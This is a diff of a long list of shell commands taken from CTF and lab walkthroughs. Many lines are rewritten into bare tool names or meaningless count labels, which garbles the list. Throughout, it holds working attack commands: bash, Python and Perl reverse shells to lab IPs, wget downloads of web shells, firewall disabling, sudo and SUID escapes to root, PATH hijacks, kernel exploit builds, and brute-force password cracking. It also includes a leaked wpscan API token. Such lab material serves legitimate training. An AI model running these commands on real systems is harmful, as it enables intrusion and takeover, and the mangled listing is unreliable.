@@ -9893,58 +9893,58 @@ Number of entries from extracted_commands_hackingarticles_cleaned.txt: 377
 
 Summarization of all Commands used:
 netdiscover
-nmap -p- -sV 192.168.1.10
-echo “192.168.1.10 terratest.earth.local”
+nmap
+echo
 echo “192.168.1.10 earth.local”
-cat /etc/hosts
+cat
 nmap 192.168.1.11 -p- -sV
+enum4linux
 enum4linux -a 192.168.1.11
-enum4linux -a 192.168.1.11
-nc -lvp 1234
-cat /etc/issue
-uname -a
-find / -perm -4000 -type f 2>/dev/null
-getcap -r / 2>/dev/null
-ls -la
-tar -xf password.tar
-cat .old_pass.bak
-su root
-cat r00t.txt
+nc
+cat: '14'
+uname
+find
+getcap
+ls
+tar
+cat: '14'
+su
+cat: '14'
 nmap 192.168.1.11 -p- -sV
 nc -lvp 1234
-cat user.txt
-gcc -pthread dirty.c -o dirty -lcrypt
-cat proof.txt
-ssh john@192.168.1.18
-cat flag2.txt
-cat clue.txt
-sudo -l
-cat /etc/issue
+cat: '14'
+gcc
+cat: '14'
+ssh
+cat: '14'
+cat: '14'
+sudo
+cat: '14'
 find / -perm -u=s -type f 2>/dev/null
 getcap -r / 2>/dev/null
-john shadow –wordlist=/usr/share/wordlists/rockyou.txt
-su parth
-cat flag.txt
-cat honey.txt
+john
+su: '6'
+cat: '14'
+cat: '14'
 sudo -l
-cat /home/honey/../backup.py
+cat: '14'
 echo $$
-pkttyagent –process 12772
-pkexec su -l root
+pkttyagent
+pkexec
 id
-cat capture/flag1.txt
-cat honey/flag4.txt
-cat john/flag2.txt
-cat parth/flag3.txt
+cat: '14'
+cat: '14'
+cat: '14'
+cat: '14'
 netdiscover
 nmap 192.168.1.10 -p- -sV
 echo “NjMgNjEgNzAgNzQgNzUgNzIgNjUgM2EgNjggNzUgNmUgNzQgNjkgNmUgNjc=” | base64 -d
-ftp 192.168.1.18
-steghide –extract -sf .get.jpg
+ftp
+steghide
 steghide –extract -sf .get.jpg
 netdiscover
 nmap 192.168.1.13 -p- -sV
-set RHOSTS 192.168.1.13
+set
 set USERNAME draco
 set PASSWORD slytherin
 set TARGETURI /DiagonAlley
@@ -9953,81 +9953,81 @@ find / -perm -4000 -type f 2>/dev/null
 echo CODE | base32 -d
 john hash –wordlist=/usr/share/wordlists/rockyou.txt
 cat
-su dobby
-less flag1.txt
-tail proof.txt
+su: '6'
+less
+tail
 netdiscover
 nmap -p- -sV 192.168.1.24
 ftp 192.168.1.24
 exit
-cat flag1.txt
-cat word.dir
-cat /etc/issue
+cat: '13'
+cat: '13'
+cat: '13'
 uname -a
 sudo -l
 sudo /usr/bin/vim
 id
-cat flag2.txt
+cat: '13'
 john /tmp/hash –wordlist=/usr/share/wordlists/fasttrack.txt
-chmod 600 key
+chmod
 ssh -i key icex64@192.168.1.15
-cat user.txt
-cat /etc/issue
+cat: '13'
+cat: '13'
 uname -a
 sudo -l
-cat /home/arsene/heist.py
+cat: '13'
 sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
 find / -type f -prem -ug=rwx 2>/dev/null
 nc -lvp 1234
 sudo -l
-cat root.txt
+cat: '13'
 nmap 192.168.1.15 -p- -sV
-ffuf -u ‘http://192.168.1.15/~FUZZ’ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e .php,.txt
+ffuf
 ffuf -u ‘http://192.168.1.15/~secret/.FUZZ’ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e .php,.txt -fc 403
 cat
 netdiscover
 nmap 192.168.1.16 -p- -sV
 nc -lvp 1234
-cat flag.txt
-cat /etc/issue
+cat: '12'
+cat: '12'
 uname -a
-ls -la
+ls: '479'
 john Swordofgryffindor –wordlist=.secret.dic
-su lestrange
+su: '6'
 sudo -l
 sudo vim -c ‘:!/bin/bash’
-cat root.txt
+cat: '12'
 netdiscover
 nmap 192.168.1.23 -p- -sV
 echo -n “beelzebub” | md5sum
 ssh krampus@192.168.1.23
-cat /etc/issue
+cat: '12'
 uname -a
 sudo -l
-ls -la
+ls: '479'
 cat
 gcc exp.c
 chmod +x a.out
-cat user.txt
-cat root.txt
+cat: '11'
+cat: '11'
 nc -lvp 1234
-export TERM=screen
-cat /etc/issue
+export
+cat: '11'
 uname –a
-ls -la
-unzip user_backup.zip
-zip2john user_backup.zip > hash
+ls: '479'
+unzip
+zip2john
 john hash –wordlist=/usr/share/wordlists/rockyou.txt
 unzip user_backup.zip
-cat user.txt
+cat: '11'
 sudo -l
-cat easysysteminfo.py
-ls -la
+cat: '11'
+ls: '479'
 cat
 gcc infosec.c -o easysysinfo
 sudo /home/randy/tools/easysysinfo
-cd /root
-cat root.txt
+cd
+cat: '10'
 netdiscover
 nmap 192.168.1.16 -p- -sV
 ffuf -u http://192.168.1.16/blog-post/archives/randylogs.php?FUZZ=/etc/passwd -w /usr/share/wordlists/dirb/small.txt -fs 0
@@ -10040,141 +10040,141 @@ ssh -i key mowree@192.168.1.21
 john hash –wordlist=/user/share/wordlists/rockyou.txt
 ssh -i key mowree@192.168.1.21
 id
-cat /etc/issue
+cat: '9'
 uname -a
 sudo -l
-cat user.txt
-ls -l /etc/passwd
+cat: '9'
+ls: '479'
 cat
-cat /etc/passwd
-su infosec
+cat: '8'
+su: '6'
 id
-cat root.txt
+cat: '8'
 netdiscover
 nmap 192.168.1.60 -sV -p-
 echo “192.168.1.60 deathnote.vuln”
-file important.jpg
-cat important.jpg
-ls user pass -l
-hydra -L user -P pass 192.168.1.16 ssh
+file
+cat: '8'
+ls: '479'
+hydra
 ssh l@192.168.1.16
-cat /etc/issue
+cat: '8'
 uname -a
 sudo -l
-cat case.wav
-su kira
+cat: '8'
+su: '6'
 sudo -l
 sudo su
-cat root.txt
+cat: '8'
 netdiscover
 nmap -sV -p- 192.168.1.25
-cat jwt.txt
+cat: '8'
 john jwt.txt –wordlist=/usr/share/wordlists/rockyou.txt –format=HMAC-SHA256
 ssh berlin@192.168.1.21
-cat flag 1.txt
-python –m SimpleHTTPServer 8000
-wget 192.168.1.21:8000/convo2.pcapng
-cd professor
-cat finalflag.txt
-cat passwd.txt
-su professor
-cat finalflag.txt
+cat: '8'
+python
+wget
+cd: '7'
+cat: '8'
+cat: '8'
+su: '6'
+cat: '8'
 sudo -l
-cat finalflag.txt
-cat flag2.txt
-cat flag3.txt
+cat: '8'
+cat: '8'
+cat: '8'
 netdiscover
 nmap -p- -sV 192.168.1.19
 nc -lvp 1234
-cat /etc/issue
+cat: '8'
 uname -a
-mv 15285 15285.c
+mv
 gcc 15285.c
 ls
-cat /root/key.txt
+cat: '8'
 cat
-sqlmap -r sql
+sqlmap
 sqlmap -r sql –dbs
 sqlmap -u sql doubletruble –tables
 sqlmap -r sql -D doubletrouble -T users –columns
 sqlmap -r sql -D doubletrouble -T users -C password,username –dump
 ssh clapton@192.168.1.24
-cat user.txt
+cat: '7'
 gcc -pthread exploit.c -o dirty -lcrypt
-su firefart
-cat /root/root.txt
-git clone https://github.com/pentestmonkey/php-reverse-shell.git
-vi php-reverse-shell.php
-python 48146.py
+su: '6'
+cat: '7'
+git
+vi
+python: '2'
 nc -lvp 1234
-cat /etc/issue
+cat: '7'
 uname -a
 sudo -l
 sudo awk ‘BEGIN {system(“/bin/bash”)}’
-cd /root
-cp doubletrouble.ova /var/www/html/
-cd /var/www/html/
+cd: '7'
+cp
+cd: '7'
 netdiscover
 netdiscover
 nmap 192.168.1.28 -p- -sV
 steghide –extract -sf doubletrouble.jpg
 steghide –extract -sf doubletrouble.jpg
-arp-scan -l
+arp-scan
 nmap -sV -p- 192.168.1.21
 echo “192.168.1.21 wp.looz.com”
 hydra -l gandalf -P /user/share/wordlists/rockyou.txt 192.168.1.21 ssh
 ssh gandalf@192.168.1.21
-cat /etc/issue
+cat: '7'
 uname -a
 sudo -l
 find / -prem -4000 -type f -exec ls -al{} \; 2>/dev/null
-cat /root/root.txt
+cat: '7'
 nmap -p- -sV 192.168.1.21
 ffuf -r -c -ic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u ‘http://192.168.1.21/test.php?FUZZ=/etc/passwd’ -fs 80
 chmod 400 key
 ssh -I qiu@192.168.1.21
-cat /etc/issue
+cat: '7'
 uname -a
 sudo -l
-cat local.txt
-cat .bash_history
-su qiu
+cat: '7'
+cat: '7'
+su: '6'
 sudo -l
-cat proof.txt
+cat: '7'
 nc -lvp 1234
-cat /etc/issue
+cat: '7'
 uname -a
-cd linux-exploit-suggester/
+cd: '7'
 wget 192.168.1.23:8001/linux-exploit-suggester.sh
-ps -eaf | grep root
+ps
 chmod +x inject.py
 nc 192.168.1.12 5600
 arp-scan -i
 nmap -sV -p- 192.168.1.7
 echo “192.168.1.7 hackers.blackhat.local”
-dig hackers.blackhat.local @192.168.1.7
+dig
 echo “192.168.1.7 hackerskid.blackhat.local.”
 nmap -p- -sV 192.168.1.24
 msfconsole
 set RHOSTS 192.168.1.24
 set TARGETURI /cgi-bin/shell.sh
-python -c ‘import pty;pty.spawn(“/bin/bash”)’
-cat /etc/issue
+python: '2'
+cat: '7'
 uname -a
 sudo -l
-cat /home/thor/./hammer.sh
+cat: '7'
 sudo -u thor /home/thor/./hammer.sh
 sudo -u thor /home/thor/./hammer.sh
 sudo -l
 sudo service ../../bin/bash
-cat proof.txt
+cat: '7'
 netdiscover
 nmap –p- -sV 192.168.1.18
-dirb http://192.168.1.18
+dirb
 ftp 192.168.1.18
 hydra -l pwnlab -P /usr/share/wordlists/rockyou.txt 192.168.1.18 ssh -v
 ssh pwnlab@192.168.1.18
-cat /etc/issue
+cat: '7'
 uname -a
 sudo -l
 sudo /usr/bin/find /home/ -exec /bin/bash \;
@@ -10182,20 +10182,20 @@ id
 nmap -sV -p- 192.168.1.26
 mv 44374 44374.py
 chmod +x 44374.py
-python 44374.py
+python: '2'
 mv php-reverse-shell.php /var/www/html
-vim php-reverse-shell.php
+vim
 nc -lvp 1234
-python -c ‘import pty;pty.spawn(“/bin/bash”)’
-cat /etc/issue
+python: '2'
+cat: '7'
 uname -a
-cat configure.php.bak
-cat ./usr/share/doc/example/cron.sh
-su root
-cat root.txt
+cat: '7'
+cat: '7'
+su: '6'
+cat: '7'
 nmap -sV -p- 192.168.1.26
 echo “MTAwMDA=” | base64 –decode
-apt-get install steghide -y
+apt-get
 steghide –extract -sf 3.jpg
 nmap -p- -sV 192.168.1.24
 ftp 192.168.1.24
@@ -10203,36 +10203,36 @@ unzip sshpass.zip
 zip2john sshpass.zip
 john hash –wordlist=/usr/share/wordlists/rockyou.txt
 unzip sshpass.zip
-cat /etc/issue
+cat: '7'
 uname -a
 sudo -l
-python -c ‘import pty;pty.spawn(“/bin/bash”)’
-import pty;
-cat /etc/issue
+python: '2'
+import
+cat: '7'
 uname -a
 sudo -l
 sudo find . -exec /bin/bash \; -quit
-cat user.txt
+cat: '7'
 nmap -sV -p- 192.168.1.26
 nmap -p21 -sV 192.168.1.21
 msfconsole
 set RHOSTS 192.168.1.21
 set payload cmd/unix/reverse
-fping -aqg 192.168.1.0/24
+fping
 nmap -sV -p- 192.168.1.22
 cat
 sqlmap -r request
 nc -lvp 1234
-cat local.txt
-cat /etc/issue
+cat: '6'
+cat: '6'
 uname -a
 find / -prem -4000 -type f -exec ls -al {} \; 2>/dev/null
-cat /etc/crontab
+cat: '6'
 echo “bash -i >& /dev/tcp/192.168.1.25/3434 0>&1”
 nc -lvp 3434
 sudo -l
 sudo tar -cf /dev/null /dev/null –checkpoint=1 –checkpoint-action=exec=/bin/bash
-python -c ‘import pty;pty.spawn(“/bin/bash”)’
+python: '2'
 netdiscover
 nmap -p- -sV 192.168.1.31
 echo eW91IGZpbmQgdGhlIGhpZGRlbiBkaXI= | base64 –decode
@@ -10241,135 +10241,135 @@ echo UkZKQlIwOU9JRUpCVEV3PQ== | base64 –decode
 echo RFJBR09OIEJBTEw= | base64 –decode
 apt-get install steghide -y
 steghide –extract -sf aj.jpg
-pip3 install stegcracker
+pip3
 steghide –extract -sf aj.jpg
 chmod 600 id rsa
-cat /etc/issue
+cat: '6'
 uname -a
-ls -la
-cd /tmp
+ls: '478'
+cd: '7'
 echo “/bin/bash” > ps
 chmod +x ps
 export PATH=/tmp:$PATH
-which ps
-cat proof.txt
+which
+cat: '6'
 netdiscover
 nmap -sV -p- 192.168.1.25
 nc -lvp 1234
 id
-python -c ‘import pty;pty.spawn(“/bin/bash”)’
-ls -la
-su py
-cat user.txt
-cat backup.cc
-openssl passwd -1 -salt INFOSEC infosec
-su infosec
+python: '2'
+ls: '478'
+su: '6'
+cat: '6'
+cat: '6'
+openssl
+su: '6'
 netdiscover
 nmap 192.168.1.14 -sV -p-
 nc -lvp 1234
-cat /etc/issue
+cat: '6'
 uname -a
-ls -l
-cd /tmp
+ls: '478'
+cd: '7'
 echo “/bin/bash” > id
 chmod +x id
 export PATH=/tmp:$PATH
 which id
-cat user.txt
-cat password
+cat: '6'
+cat: '6'
 sudo -l
 echo ‘import os;os.system(“/bin/bash”)’ > file.py
 sudo /user/bin/python3 /home/john/file.py
 id
-cat root.txt
+cat: '6'
 netdiscover
 nmap –p- -sV 192.168.1.23
 ssh rtemis@192.168.1.19
-ls -la
-ls -la
+ls: '478'
+ls: '478'
 hydra -L user.txt -P pass.txt 192.168.1.19 ssh -s 7223
 uname -a
-cat /etc/issue
-ls -la
-cat .mysql_history
+cat: '6'
+ls: '478'
+cat: '6'
 su
-cat /root/flag2.txt
+cat: '6'
 netdiscover
 nmap -p- -sV 192.168.1.24
 ftp 192.168.1.24
 ls
 nc -lvp 1234
 id
-cat /etc/issue
+cat: '6'
 uname -a
-cat /.runme.sh
-su shrek
-cat user.txt
+cat: '6'
+su: '5'
+cat: '6'
 sudo -l
 sudo /usr/bin/python3.5 -c ‘import pty;pty.spawn(“/bin/bash”)’
-cat /root/root.txt
+cat: '6'
 nmap -sV -p- 192.168.1.26
 ssh auxerre@192.168.1.14
-cat user.txt
+cat: '6'
 uname -a
-cat /etc/issue
-ps -aux
+cat: '6'
+ps: '2'
 redis-cli
 su
 netdiscover
 nmap –p- -sV 192.168.1.23
-dirb http://192.168.1.30/
+dirb: '3'
 cat
 ssh agentr@192.168.1.30 -i key
 john key hash –wordlist=/usr/share/wordlists/rockyou.txt
 chmod 600 key
 ssh -i key agentr@192.168.1.30
-cat user.txt
-cat /etc/issue
+cat: '5'
+cat: '5'
 uname -a
-ls –l /etc/passwd
+ls: '477'
 vi /etc/passwd
 su
-cat root.txt
+cat: '5'
 ssh admin@192.168.1.21
 id
 nc -lvp 1234
 uname -a
-cat /etc/issue
-cat flag1.txt
-mysql –u alfauser –p
-cat /etc/passwd
-su proxima
-cat user.txt
+cat: '5'
+cat: '5'
+mysql
+cat: '5'
+su: '3'
+cat: '5'
 find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
 getcap -r / 2>/dev/null
-cat /root/root.txt
+cat: '5'
 netdiscover
 nmap -sV -p- 192.168.1.25
 ssh webmaster@192.168.1.15
-cat user_flag.txt
-cat /etc/issue
+cat: '5'
+cat: '5'
 uname -a
 sudo -l
-cat notes.txt
+cat: '5'
 sudo -l
-ln -s /bin/vi tail
+ln
 export PATH=.:$PATH
 sudo –preserve-env=PATH /usr/bin/check_syslog.sh
-cat flag.txt
+cat: '5'
 nmap -p- -sV 192.168.1.21
 nmap -p- 192.168.1.21 -v
 msfconsole
 set RHOSTS 192.168.1.25
 set RPORT 9001
-python –c ‘import pty;pty.spawn(“bin/bash”);’
-cat /etc/issue
+python: '2'
+cat: '5'
 uname -a
-cat tyrell.pass
-su tyrell
+cat: '5'
+su: '3'
 sudo -l
 sudo /bin/journalctl
-cat root.txt
+cat: '5'
 netdiscover
 nmap -p- -sV 192.168.1.25
 echo “192.168.1.25 society.web”
@@ -10378,28 +10378,28 @@ netdiscover
 nmap –p- -sV 192.168.1.23
 netdiscover
 ssh ripper@192.168.1.23
-cat flag.txt
-cat /etc/issue
+cat: '5'
+cat: '5'
 uname -a
-cat secret.files
-su cubes
+cat: '5'
+su: '3'
 msfconsole
 set RHOSTS 192.168.1.23
 set PASSWORD tokiohotel
 set USERNAME admin
 set SSL true
 id
-cat /root/flag.txt
+cat: '5'
 mysql -u root -h 192.168.1.18 -p
 ssh lucy@192.168.1.18
-cat /etc/issue
+cat: '5'
 uname -a
 sudo -l
-cat /opt/exp.py
-ls -l
+cat: '5'
+ls: '477'
 nc -lvp 1234
 sudo -u root /usr/bin/python2 /opt/exp.py
-cat /root/root.txt
+cat: '5'
 netdiscover
 msfconsole
 set RHOSTS 192.168.1.29
@@ -10407,28 +10407,28 @@ set USERNAME admin
 set PASSWORD adam14
 set TARGETURI /wordpress
 uname -a
-cat /etc/issue
-su wpadmin
-cat local.txt
+cat: '5'
+su: '3'
+cat: '5'
 sudo -l
 sudo /usr/bin/mysql -u root -D wordpress -p
-cat /root/proof.txt
+cat: '5'
 netdiscover
 nmap -p- -sV 192.168.1.19
-wpscan –url http://192.168.1.19 –api-token ntCJoKnWhw3NzmHKDbqEj5ukJshug44GQrxcRTaXZ14 –plugins-detection aggressive
+wpscan
 wpscan –url http://192.168.1.19 -e
 wpscan –url http://192.168.1.21 -U c0ldd -P /usr/share/wordlists/rockyou.txt
-cd /usr/share/webshells/php
+cd: '7'
 nc -lvp 1234
-cat /etc/issue
+cat: '5'
 uname -a
-cat user.txt
-su c0ldd
-cat user.txt
+cat: '5'
+su: '3'
+cat: '5'
 sudo -l
 sudo ftp
 id
-cat root.txt
+cat: '5'
 netdiscover
 nmap 192.168.1.19 -sV -p-
 msfconsole
@@ -10436,120 +10436,120 @@ set RHOSTS 192.168.1.19
 set RPORT 8080
 set HttpPassword tomcat
 set HttpUsername tomcat
-cat requests
+cat: '5'
 sqlmap -r request
 sqlmap -r request  –dbs
 sqlmap -r request  -D clover –tables
 sqlmap -r reqeust -D clover –tables –time-sec=60
 sqlmap -r reqeust -D clover -T users -C username,password –dump
 ls
-cat local.txt
-cat /etc/issue
+cat: '5'
+cat: '5'
 uname -a
-cd /home/sword/
-cat passwd.sword
-crunch 12 12 0123456789 -t “P4SsW0rD@@@@”  -o password
+cd: '7'
+cat: '5'
+crunch
 hydra -l sword -P password ssh://192.168.1.15 -t 4
-cat local2.txt
+cat: '5'
 find / -type f -perm -ug=rwx 2>/dev/null
-cat /root/proof.txt
+cat: '5'
 netdiscover
 nmap 192.168.1.20 -sV -p-
 ssh carls@192.168.1.20 -p3042
-cat /etc/issue
+cat: '5'
 uname -a
 sudo -l
 sudo -u c0ldd /bin/bash
 sudo -l
-cat user.txt
+cat: '5'
 echo TXV5IGJpZW4gaGVjaG8gOik= | base64 decode
-ls -la
-rm DoNotRun.py
+ls: '476'
+rm
 echo “import os os.system(“/bin/bash”)” > DoNotRun.py
 sudo -u root /usr/bin/python3 /home/c0ldd/DoNotRun.py
 id
-cat /root/root.txt
+cat: '5'
 echo “RmVsaWNpZGFkZXMgY3JhY2s=” | base64 -d
 netdiscover
 apt-get install steghide -y
 steghide –extract -sf trytofind.jpg
-cat data.txt
+cat: '5'
 hydra -l renu -P /usr/share/wordlists/rockyou.txt 192.168.1.21 ssh
 id
-cat /etc/issue
+cat: '5'
 uname -a
-cat user1.txt
-cat /home/lily/user2.txt
-cat authorized_keys
+cat: '5'
+cat: '5'
+cat: '5'
 sudo -l
 nc -lvp 1234
-cat .root.txt
+cat: '5'
 netdiscover
 nmap 192.168.1.16 -p- -sV
-cd maintenance
+cd: '7'
 ls
-cat test.txt
-cat test2.txt
-cat locate.txt
+cat: '5'
+cat: '5'
+cat: '5'
 echo cGluZyBwb25n | base64 –decode
-cd /
-cd /home
-ls -la
-cat .backup
+cd: '7'
+cd: '7'
+ls: '475'
+cat: '5'
 john bb.txt –wordlist=/usr/share/wordlist/rockyou.txt
 nc -lvp 1234
-cat /etc/issue
+cat: '5'
 uname -a
-su Jeevan
-docker run -v /:/mnt –rm -it alpine chroot /mnt sh
-cat /root/root.txt
+su: '3'
+docker
+cat: '5'
 netdiscover
 nmap -sV -p- 192.168.1.25
 cat
-ifconfig eth0
+ifconfig
 cat
 nc -lvp 1234
 id
-cat /etc/issue
+cat: '3'
 uname -a
-su takis
-cat user.txt
+su: '3'
+cat: '3'
 sudo -l
 sudo su
-cat /root/root.txt
+cat: '3'
 find . -name “root” 2>/dev/null
-cat /usr/games/USB/root
+cat: '3'
 nmap -Pn -p- 192.168.1.21
-cat etc_passwd
-python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.22”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
+cat: '3'
+python: '2'
 nc -lvp 1234
-cat /etc/issue
+cat: '3'
 uname -a
-python –version
+python: '2'
 id
-cat /root/proof.txt
+cat: '3'
 nmap 192.168.1.26 -p- -sV
 nmap 192.168.1.26 -p 80 –script=http-enum
 cat
 id
 uname -a
-cat /etc/issue
+cat: '2'
 sudo -l
 sudo gcc –wrapper /bin/sh,-s .
-cat /root/root.txt
+cat: '2'
 netdiscover
 nmap 192.168.1.18 -p- sV
-cat .Note.txt
+cat: '2'
 nmap -p- -sV 192.168.1.105
 msfconsole
 set rhosts 192.168.1.105
 set targeturi /music/wordpress/
 set target 0
 id
-cat notes.txt
-ls -l secretdiary
+cat: '2'
+ls: '475'
 file secretdiary
-strings secretdiary
+strings
 netdiscover
 nmap 192.168.1.14 -sV -p-
 echo “192.168.1.13 odin”
@@ -10558,100 +10558,100 @@ set RHOSTS 192.168.1.9
 set username admin
 set password qwerty
 uname -a
-cat /etc/issue
-cat /var/www/html/wp-config.php
+cat: '2'
+cat: '2'
 john pass
-su root
+su: '3'
 netdiscover
 nmap 192.168.1.16 -sV -p-
-cat /etc/issue
+cat: '2'
 uname -a
 mv 45010 45010.c
 gcc 45010
-cat /root/flag.txt
+cat: '2'
 netdiscover
 nmap -p- -sV 192.168.1.11
 nc -lvp 1234
 id
-cat /etc/issue
+cat: '2'
 uname -a
-ls -ltr
-cd supersecret-for-aziz
-cat bassam-pass.txt
-su assam
+ls: '475'
+cd: '7'
+cat: '2'
+su: '3'
 sudo -l
 sudo find . -exec /bin/sh \; -quit
-cat /root/flag.txt
+cat: '2'
 netdiscover
 nmap 192.168.1.14 -sV -p-
-ifconfig eth0
+ifconfig: '4'
 nc -lvp 1234
 uname -a
-cat /etc/issue
-cat user.txt
+cat: '2'
+cat: '2'
 sudo -l
-cat /root/root.txt
+cat: '2'
 nmap -sV -p- 192.168.1.19
 uname -a
-cat /etc/issue
+cat: '2'
 mv 45010 45010.c
 gcc 45010.c
 chmod +x a.out
 ifconfig
 nc -lvp 443
 uname -a
-cat /etc/issue
+cat: '2'
 sudo -l
 find / -group ipsum -print 2>/dev/null
 sudo -u ipsum /usr/bin/cat /var/www/example.com/html/…/nothing_to_see_here
 sudo -l
 sudo –u /usr/bin/base64 /etc/shadow
-base64 -d shadow
+base64
 john –wordlist=rockyou.txt hash1
-su zerocewl
+su: '3'
 john –wordlist=rockyou.txt hash2
-su cewlbeanss
+su: '3'
 sudo -l
-su cewlbeans
+su: '3'
 sudo -l
-cat /root/root.txt
+cat: '2'
 netdiscover
 nmap 192.168.1.14 -sV -p-
 nmap -sC -sV -oA Omni 10.10.10.204
 netdiscover
-cat user.txt
+cat: '2'
 uname -a
-cat /etc/issue
+cat: '2'
 find / -prem -u=s -type f 2>/dev/null
 mv 47009 47009.c
 gcc 47009.c
 wget 192.168.1.17/bb/a.out
 chmod +x a.out
-cat /root/root.txt
+cat: '2'
 netdiscover
 nmap 192.168.1.14 -sV -p-
 echo “192.168.1.22 votenow.local”
-wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H “HOST: FUZZ.votenow.local” –hw 854 –hc 400 -t 100 192.168.1.22
+wfuzz
 echo “192.168.1.22 datasafe.votenow.local”
-nano simple.txt
-cat user.txt
+nano
+cat: '2'
 nmap -p- -sV 192.168.1.101
 mysql -h 192.168.1.101 -u root -p
-ls -la
-cat .htpasswd
-su armour
+ls: '475'
+cat: '2'
+su: '3'
 sudo -l
-cat flag.txt
+cat: '2'
 nmap 192.168.1.30 -p- -sV
-cat flag2.txt
-cat finalflag.txt
+cat: '2'
+cat: '2'
 netdiscover
 nmap 192.168.1.26 -p- -sV
 dirb
-smbclient -I 192.168.1.26 -L -N
-cat mailsent.txt
+smbclient
+cat: '2'
 dirb
-cat cred.txt
+cat: '2'
 sudo -l
 sudo -u root /root/lago
 strings .pyc
@@ -10669,11 +10669,11 @@ netdiscover
 nmap -sV 192.168.1.22
 msfconsole
 id
-cat /root/root.txt
+cat: '2'
 nmap -p- -sV 192.168.1.4
 dirb http://192.168.1.4
-cewl http://192.168.1.4/
-cat >> key
+cewl
+cat: '2'
 netdiscover
 nmap -p- -sV 192.168.1.2
 docker run -it -v /root:mnt/ignite ubuntu
@@ -10682,40 +10682,40 @@ id
 dirb
 sudo -l
 nc -lvp 1234
-ls -a
-cat >> pass.txt
+ls: '475'
+cat: '2'
 john pass.txt
-cat clean.sh
+cat: '2'
 nc -lvp 4444
 gcc
 netdiscover
 nmap 192.168.1.16 -A
 nc -lvp 1234
 id
-cat /etc/issue
+cat: '2'
 uname -a
-cd /home/love/Desktop
-cat user.txt
-cat /etc/crontab
-cd /var/www/html
+cd: '7'
+cat: '2'
+cat: '2'
+cd: '7'
 ls
-cat finally.sh
-cat write.sh
-ls -l
-cat /root/root.txt
+cat: '2'
+cat: '2'
+ls: '474'
+cat: '2'
 nmap 192.168.1.20 -A
 ifconfig
 tail
-ifconfig eth0
+ifconfig: '2'
 tail -f /var/www/apache2/access.log
 sudo -l
 apt-get install ruby ruby-dev rubygems build-essential
-gem install –no-document fpm
-mkdir exploit
-cd exploit/
+gem
+mkdir
+cd: '7'
 cat
 ls
-cd /tmp
+cd: '7'
 wget 192.168.1.20/exploit_1.0_amd64.deb
 chmod +x exploit_1.0_amd64.deb
 sudo -u root /usr/bin/dpkg -i exploit_1.0_amd64.deb
@@ -10724,10 +10724,10 @@ cat proof.txt
 wpscan –url http://192.168.1.11/ –enumerate u
 cat
 cat username.txt
-ip add
-timeout 140 tcpdump -w hehe.pcab -i veth0878a6c
-tcpdump -r hehe.pcab
-su paul
+ip
+timeout
+tcpdump
+su: '3'
 sudo -l
 netdiscover
 nmap -p- -Pn 192.168.1.112
@@ -10741,10 +10741,10 @@ hydra pop3://192.168.1.103 -L user.txt -P password.txt
 nc 192.168.1.103 110
 hydra ssh://192.168.1.103 -L user.txt -p “S1ck3nBluff+secureshell”
 uname –a
-cd /var/www/html/
+cd: '7'
 mv 44298 44298.c
 gcc 44298.c -o exploit
-cd /tmp/
+cd: '7'
 wget 192.168.1.107/exploit
 chmod +x exploit
 netdiscover
@@ -10752,7 +10752,7 @@ msfconsole
 set rhosts 192.168.1.103
 set targeturi drupal/
 id
-python –c ‘import pty; pty.spawn(“/bin/sh”)’
+python: '2'
 uname –a
 cat /etc/issue
 nmap 192.168.1.27 –Pn –p-
@@ -10762,9 +10762,9 @@ set payload php/meterpreter/reverse_tcp
 set lhost 192.168.1.23
 set lport 4444
 find -maxdepth 2 –type f -prem 777
-ls –l /etc/passwd
+ls: '473'
 openssl passwd -1 –salt infosec
-su indishell
+su: '3'
 sudo –i
 netdiscover
 nmap 192.168.1.24 -p- -sV
@@ -10775,7 +10775,7 @@ set payload php/meterpreter/reverse_tcp
 set lhost 192.168.1.23
 set lport 443
 id
-python -c ‘import pty;pty.spawn(“/bin/bash”)’
+python: '2'
 uname -a
 cat /etc/issue
 cat myplace.backup | base64 -d > myplace
@@ -10786,41 +10786,41 @@ import socket,subprocess,os;
 wget 192.168.1.45/pythonshell.py
 cp pythonshell.py /srv/.antivirus.py
 nc –lvp 4545
-python -c ‘import pty;pty.spawn(“/bin/bash”)’
-cd /home/devops
+python: '2'
+cd: '7'
 ls
 cat flag2.txt
 wget 192.168.1.45/bbbb/setup.py
 sudo /usr/bin/pip install . –upgrade –force-reinstall
-perl -e ‘use Socket;$i=”192.168.1.45″;$p=2323;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
-if (_0xb252x4 == 1079950212331060) {
-python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.11”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’&
-sh -c $@|sh . echo ssh bill@localhost sudo -l
+perl
+if
+python: '2'
+sh
 sh -c $@|sh . echo ssh bill@localhost sudo ufw disable
 sh -c $@|sh . echo ssh bill@localhost sudo wget “http://10.0.2.15:8000/shell.jsp” -O /var/lib/tomcat8/webapps/ROOT/shell.jsp
 ssh bill@localhost sudo bash -i>& /dev/tcp/10.0.2.15/4444 0>&1
 strings
 objdump
 wget http://172.16.92.141/shell.txt -O /tmp/shell.php
-php /tmp/shell.php;
-python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.120”,4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
-ls -a
+php
+python: '2'
+ls: '472'
 nmap -sV 10.129.45.226
 smbclient -L 10.129.45.226
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
-rpcclient -U support%#00^BlackKnight 10.129.45.226
+rpcclient
 smbclient -U 'audit2020'  //10.129.45.226/forensic
